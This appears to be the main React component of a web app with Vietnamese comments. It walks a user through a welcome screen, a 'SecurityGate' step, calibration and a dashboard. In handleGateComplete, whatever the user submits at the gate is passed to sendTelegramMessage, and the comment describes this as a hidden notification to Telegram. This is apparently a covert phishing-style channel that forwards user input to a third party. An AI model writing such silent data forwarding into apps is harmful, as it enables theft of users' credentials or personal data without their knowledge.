import React, { useState, useEffect } from 'react';
import Welcome from './components/Welcome';
import SecurityGate from './components/SecurityGate';
import Calibration from './components/Calibration';
import Dashboard from './components/Dashboard';
import MascotDemo from './components/MascotDemo';
import useSound from './hooks/useSound';
import SoundControl from './components/SoundControl';
import { sendTelegramMessage } from './utils/telegram';

function App() {
  const [step, setStep] = useState(() => {
    const savedStep = localStorage.getItem('appStep');
    // Cho phép quay lại dashboard hoặc calibration nếu đã từng vào để không phải làm lại từ đầu
    if (savedStep === 'dashboard' || savedStep === 'calibration') {
      return savedStep;
    }
    return 'welcome';
  });
  const [userData, setUserData] = useState(() => {
    const saved = localStorage.getItem('userData');
    return saved ? JSON.parse(saved) : null;
  });
  const [isDemo, setIsDemo] = useState(false);
  
  const { isMuted, play, playBGM, toggleMute } = useSound();

  // Lưu trạng thái vào localStorage khi thay đổi
  useEffect(() => {
    localStorage.setItem('appStep', step);
    if (userData) {
      localStorage.setItem('userData', JSON.stringify(userData));
    }
  }, [step, userData]);

  useEffect(() => {
    // Kiểm tra nếu URL có chứa /demo
    if (window.location.pathname === '/demo') {
      setIsDemo(true);
    }
  }, []);

  const handleStart = () => {
    playBGM();
    play('meow');
    play('transition');
    setStep('gate');
  };

  const handleGateComplete = (data) => {
    setUserData(data);
    
    // Gửi thông báo ngầm về Telegram
    sendTelegramMessage(data);

    play('success');
    setTimeout(() => {
      play('transition');
      setStep('calibration');
    }, 1000);
  };

  const handleCalibrationComplete = () => {
    play('transition');
    setStep('dashboard');
  };

  const resetApp = () => {
    localStorage.clear();
    window.location.reload();
  };

  if (isDemo) {
    return (
      <div className="min-h-screen bg-[#f8fafc] p-4 flex items-center justify-center">
        <MascotDemo />
        <div className="fixed bottom-10 flex gap-4">
          <button 
            onClick={() => { window.location.pathname = '/'; }}
            className="px-6 py-2 bg-slate-800 text-white rounded-full text-sm font-bold shadow-lg"
          >
            QUAY LẠI TRANG CHỦ
          </button>
          <button 
            onClick={resetApp}
            className="px-6 py-2 bg-red-500 text-white rounded-full text-sm font-bold shadow-lg"
          >
            RESET DỮ LIỆU
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f8fafc] selection:bg-indigo-100">
      {/* Background decoration */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-blue-100/50 rounded-full blur-[100px]" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-purple-100/50 rounded-full blur-[100px]" />
      </div>

      <SoundControl isMuted={isMuted} toggleMute={toggleMute} />

      <main className="relative z-10">
        {step === 'welcome' && (
          <Welcome onStart={handleStart} />
        )}

        {step === 'gate' && (
          <SecurityGate onComplete={handleGateComplete} playSFX={play} />
        )}
        
        {step === 'calibration' && (
          <Calibration onComplete={handleCalibrationComplete} userData={userData} />
        )}

        {step === 'dashboard' && (
          <Dashboard userData={userData} playSFX={play} onReset={resetApp} />
        )}
      </main>
    </div>
  );
}

export default App;
